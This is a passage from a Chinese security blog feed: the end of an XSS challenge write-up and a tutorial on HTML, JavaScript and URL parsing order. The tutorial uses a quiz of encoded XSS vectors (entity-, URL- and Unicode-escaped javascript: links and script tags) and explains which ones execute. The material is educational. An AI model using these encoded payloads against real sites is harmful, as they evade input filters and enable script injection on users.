class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--" data-comment='&#123;"id":0&#125;'&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;p class="comment" title="--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">&lt;!--<span class="string">" data-comment='&#123;"</span>id<span class="string">":1&#125;'&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"--&gt;prompt(1&lt;!--"</span> data-comment=<span class="string">'&#123;"id":2&#125;'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"--&gt;)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" data-comment='&#123;"id":3&#125;'&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">======================================================================</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">`<span class="string">" data-comment='&#123;"</span>id<span class="string">":0&#125;'&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"$&#123;prompt(1)&#125;"</span> data-comment=<span class="string">'&#123;"id":1&#125;'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" data-comment='&#123;"id":2&#125;'&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-16"><a class="markdownIt-Anchor" href="#6-xss-类型-16"></a> <code>⑥ xss 类型</code></h4><blockquote><p>注释问题</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;这是我在无意中遇到的一个&lt;code&gt;xss&lt;/code&gt; 网站，花了将近一周的时间才做完，每道题的背后都会隐藏着许多知识点，其中关于&lt;a href=&quot;https://muzibing.github.io/2020/02/24/2020.02.24%
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://muzibing.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>【知识点整理】浏览器解析：HTML解析_JS解析_URL解析</title>
    <link href="https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/24/2020.02.24（95）/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-03-09T08:11:53.356Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy一-判断下列语句能否成功执行font"><a class="markdownIt-Anchor" href="#font-color-navy一-判断下列语句能否成功执行font"></a> <font color="navy">一、判断下列语句能否成功执行</font></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">Basics</span><br><span class="line"></span><br><span class="line">0x01. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// URL encoded "javascript:alert(1)"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x02. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29"</span>&gt;</span></span><br><span class="line">// Character entity encoded "javascript" and URL encoded "alert(2)"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x03. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// URL encoded ":"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x04. <span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">// Character entity encoded <span class="tag">&lt; <span class="attr">and</span> &gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x05. <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">// Character entity encoded <span class="tag">&lt; <span class="attr">and</span> &gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute AND the character entities will NOT</span><br><span class="line">be decoded either</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x06. <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Advanced</span><br><span class="line">0x07. <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">// Character entity encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x08. <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">// Unicode escape sequence encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x09. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Character entity encoded alert(9);</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0A. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0B. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert(11)</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0C. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert and 12 </span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0D. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode escape sequence encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0E. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// escape sequence encoded line feed.</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line">Bonus</span><br><span class="line">0x0F. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br></pre></td></tr></table></figure><h3 id="font-color-navy二-相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy二-相关知识font"></a> <font color="navy">二、相关知识</font></h3><h4 id="0x01-html-解析"><a class="markdownIt-Anchor" href="#0x01-html-解析"></a> 0x01 HTML 解析</h4><blockquote><p><font color="red"><strong>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那边被实体编码的内容的，即 HTML解析器 不会做解码的工作。</strong></font></p><p><strong>只有建立起DOM 树，才能对每个节点的内容进行识别，这时候如果出现实体编码，则会进行实体解码。但是这时候解析出来假如有新的标签，那么不会在加入DOM树,只是作为字符串处理。比如<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>。</strong></p><p>并且不是所有节点内容都会进行实体解码，比如<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code> 里面的代码<sup>0x04</sup>。</p><p>以上对于标签的识别，并不只是标签头本身，也包括其中的属性、结构等。</p></blockquote><p><code>小知识点：</code></p><ol><li><strong>script标签内无法解析HTML实体编码</strong>，因为其不是在 data state 数据段内，<code>SVG</code> 属于支持 <code>XML</code> 解析，所以那么我们就很好理解了，因为下 <code>xml</code> 支持在标签内解析 <code>HTML</code> 实体字符，所以在 <code>XML</code> 中(会被解析成（</li><li>当HTML 解析器处于<code>数据状态（DataState）</code>、<code>RCDATA 状态（RCDATA State）</code>、<code>属性值状态（Attribute Value State）</code>时，字符实体会被解码为对应的字符。</li><li>在原始文本元素（<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>）类型标签下的所有字符实体编码都不会被 HTML 解码。</li></ol><h4 id="0x02-javascript-解析"><a class="markdownIt-Anchor" href="#0x02-javascript-解析"></a> 0x02 JavaScript 解析</h4><p><code>javascript解析器的入口：</code></p><blockquote><ul><li><strong>标签</strong></li><li><strong>onlick</strong> <strong>等事件</strong> <strong>js</strong> <strong>的动作</strong></li><li><strong>url</strong> <strong>调用</strong> <strong>javascript:</strong> <strong>伪协议</strong></li><li><strong>css</strong> <strong>调用引入文件，或</strong> <strong>url</strong> <strong>再间接引入</strong> <strong>javascript:</strong></li><li><strong>eval()</strong> <strong>调用</strong></li><li><strong>定时器触发</strong></li></ul></blockquote><p><code>Unicode转义序列出现的地方</code></p><blockquote><p>从上下文来看，可以分为三个地方：<strong>字符串中，标识符名称中和控制字符（(,),;,&quot;,'等）中。</strong></p><ul><li>字符串中：转义序列只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。</li><li>标识符名称中：转义序列会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。</li><li>控制字符中：转义序列将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。</li></ul><p>JavaScript解析时只有<strong>标识符名称</strong>不会被当做字符串，<strong>控制字符</strong>仅会被解析为标示符名称或者字符串。</p><p>Javascript解析器工作的时候可以将\u0061\u006c\u0065\u0072\u0074进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称，不能作为控制字符解析。</p></blockquote><p><code>JavaScript 解析器</code><sup>[0x04]</sup></p><blockquote><p>形如 \uXXXX 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。 首先，JavaScript 中有三个地方可以出现 Unicode 字符转义序列：</p><p>1、字符串中（in String）</p><p>      Unicode 转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。</p><p>      例如，<code>&lt;script&gt;alert(“\u0031\u0030″);&lt;/script&gt;</code></p><p>      被编码转义的部分为 10，是字符串，会被正常解码，JS 代码也会被执行。</p><p>2、标识符中（in identifier names）</p><p>      若 Unicode 转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。</p><p>      例如，<code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></p><p>      被编码转义的部分为 alert 字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS 代码也会被执行。</p><p>3、控制字符中（in control characters）</p><p>      若 Unicode 转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。 控制字符即’、”、()等。</p><p>      例如，<code>&lt;script&gt;alert\u0028″xss”);&lt;/script&gt;</code>，(进行了 Unicode 编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分alert(。</p><p>      因此函数的括号之类的控制字符进行 Unicode 转义后是不能被正常解释的。</p></blockquote><p><code>例题</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(\u0031)"</span>)&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('\u0031')"</span>)&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(1)"</span>)&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"</span>)&gt;</span>test4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)"</span>)&gt;</span>test5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript\u003aalert(1)"</span>)&gt;</span>test6<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('1\u000a')"</span>)&gt;</span>test7<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">测试</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">test</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test1</td><td style="text-align:center">失败，解析为字符串1，需要单引号<br>// 之所以添加单引号，是因为 JS 解码后的结果只能为子字符串或标识符 //</td></tr><tr><td style="text-align:center">test2</td><td style="text-align:center">弹框，编码 ’ 则失败</td></tr><tr><td style="text-align:center">test3</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test4</td><td style="text-align:center">失败，编码括号</td></tr><tr><td style="text-align:center">test5</td><td style="text-align:center">失败，URL解码时，不以javascript伪协议解析，寻找根目录下链接</td></tr><tr><td style="text-align:center">test6</td><td style="text-align:center">失败，同上，寻找相对路径链接</td></tr><tr><td style="text-align:center">test7</td><td style="text-align:center">弹框，可以添加换行符，不受影响。\u000a：换行符</td></tr></tbody></table><p><code>个人理解</code></p><blockquote><ul><li>javascript 解码后的结果是<code>字符串</code>或者是<code>标识符名称</code>，</li><li>控制符有 <code>(</code>、<code>)</code>、<code>;</code>、<code>&quot;</code> 和 <code>'</code> 等</li></ul></blockquote><p><code>javascript 解码本质</code></p><blockquote><p><font color="red"><strong>Unicode 序列不能出现在控制字符中，否则不能被解释。</strong></font></p></blockquote><h4 id="0x03-url-解码"><a class="markdownIt-Anchor" href="#0x03-url-解码"></a> 0x03 URL 解码</h4><blockquote><ol><li><p><code>&lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29&quot;&gt;test1&lt;/a&gt;</code></p><p><font color="brown">URL解析过程中的一个细节：<strong>URL 不能对协议类型进行任何的编码操作</strong>，否则URL解析器会认为它无类型，就导致上述被编码的“javascript”没有解码，当然不会被URL解析器识别了。</font></p></li><li><p>src 中是可以进行 URL 编码的，当输出环境在 href     或者 src 属性内时，可通过javascript 伪协议来执行 JS 代码 。</p></li><li><p>html中的 <code>&lt;a&gt;</code> 标签的 href 属性，url 解析器会对 href 内部的内容进行一次url解析，js中的window.open(),url解析器会对括号内部的内容进行一次url解析，URL解析过程中的一个细节了，不能对伪协议类型进行任何的编码操作，否则URL解析器会认为它无类型。这个协议类型的格式是javascript:不是只是javascript。除此了javascript:伪协议可以执行js代码之外，还有IE下的vbscript,Mozilla下的dataURL(data:text/html;这里可以直接添加html的<code>&lt;script&gt;</code>标签，会执行)</p></li></ol></blockquote><p><code>小知识点：URL 的格式</code></p><p><img src="/images/95-1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">完整的URI格式：[协议名]://[用户名]:[密码]@[主机名]:[端口]/[路径]?[查询参数]#[片段 ID]</span><br></pre></td></tr></table></figure><blockquote><p>首先，要注意的是 URL 的 Scheme 部分（协议部分）必须为 ASCII 字符，即不能被任何编码，否则 URL 解析器的状态机将进入 No Scheme 状态。</p><p>▪ <strong>示例1</strong>：<code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></p><p>        URL 编码部分的是javascript:alert(1)，但是 JS 不会被执行，因为作为 Scheme 部分的”javascript”这个字符串被编码（其中javascript是一种伪协议），导致 URL 解析 器状态机进入 No Scheme 状态。</p><p>        URL 中的 : （冒号）也不能被以任何方式编码，否则 URL 解析器的状态机也将进入 No Scheme 状态。<code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code>由于 : (冒号)被 URL 编码为%3a，导致 URL 状态机进入 NoScheme 状态，JS 代码不能执行。</p><p>▪ <strong>示例2</strong>：<code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;&lt;/a&gt;</code></p><p>        “JavaScript” 这个字符串被实体化编码，: （冒号）没有被编码，alert(2) 被 URL编码，成功执行。首先，在 HTML 解析器中，HTML状态机处于属性值状态（Attribute Value State）时，字符实体时会被解码的，此处在 href 属性中，所以被实体化编码的 “javascript”字符串会被解码。其次，HTML 解析是在URL解析之前的，所以在进行 URL 解析之前，Scheme 部分的”javascript”字符串已被解码，而并不再是被实体编码的状态。</p></blockquote><h4 id="0x04-相关实践"><a class="markdownIt-Anchor" href="#0x04-相关实践"></a> 0x04 相关实践</h4><p><img src="/images/95-3.png" alt></p><p><img src="/images/95-2.png" alt></p><h3 id="font-color-navy三-详解每条原因font"><a class="markdownIt-Anchor" href="#font-color-navy三-详解每条原因font"></a> <font color="navy">三、详解每条原因</font></h3><p><code>0x01</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹出。因为 <code>“%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29”</code> 是 <code>URL</code> 编码，在 HTML 解析上述语句所得到的还是该语句本身，而 <code>URL</code> 编码在编码 <code>URL</code> 时，要求 <code>URL</code> 的 <code>Scheme</code>  部分（协议部分）必须为 <code>ASCII 字符</code>，即不能被任何编码，否则 <code>URL 解析器</code>的状态机将进入 <code>No Scheme 状态</code>。所以作为Scheme 部分的 <code>”javascript”</code> 这个字符串被编码（其中 <code>javascript</code> 是一种伪协议），导致 <code>URL 解析器</code>状态机进入 <code>No Scheme 状态</code>。</p></blockquote><p><code>0x02</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能正常弹出。因为 <code>&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&quot;</code> 是实体编码，所以在 <code>HTML 解析器</code> 解析后，上述实体编码被解码为 <code>javascript</code>，上述语句变为<code>&lt;a href=&quot;JavaScript:%61%6c%65%72%74%28%32%29&quot;&gt;</code>，这个时候 <code>URL 解析器</code>  遇见 <code>javascript:</code> 就会对后面的 <code>URL 编码</code> 解码，变为如下语句 <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code> ，所以成功弹窗。</p></blockquote><p><code>0x03</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。虽然 <code>JavaScript</code> 没有被编码，但是 <code>URL 解析器</code> 在编码时是对 <code>javascript:</code> 识别状态，不是 <code>javascript</code>，所以 <code>URL 解析器</code>的状态机将进入 <code>No Scheme 状态</code>，所以不会弹窗。</p></blockquote><p><code>0x04</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。</p><ul><li><p><font color="red"><strong>分析一</strong></font>：HTML 解析过程：<code>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个'&lt;'符号（后面没有跟'/'符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。这里有三种情况可以容纳字符实体，“数据状态中的字符引用”，“RCDATA 状态中的字符引用”和“属性值状态中的字符引用”。在这些状态中HTML字符实体将会从“&amp;#...”形式解码，对应的解码字符会被放入数据缓冲区中。</code>在该问题中，“<code>&lt;</code>”和“<code>&gt;</code>”字符被编码为“<code>&amp;#60;</code>”和“<code>\&amp;#62;</code>”。当解析器解析完“<code>&lt;div&gt;</code>”并处于“数据状态”时，这两个字符将会被解析。当解析器遇到“&amp;”字符，它会知道这是“数据状态的字符引用”，因此会消耗一个字符引用（例如 “<code>&amp;#60;</code>” ）并释放出对应字符的 <code>token</code>。在这个例子中，对应字符指的是 “<code>&lt;</code>” 和 “<code>&gt;</code>” 。读者可能会想：这是不是意味着“<code>&lt;</code>”和“<code>&gt;</code>”的 <code>token</code> 将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到“标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成 “数据”。</p></li><li><p><font color="red"><strong>分析二</strong></font>：&lt;和&gt;被编码为字符实体&lt;和&gt;。 当 HTML 解析器解析完<div>时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体&lt;时因为处在数据状态（Data 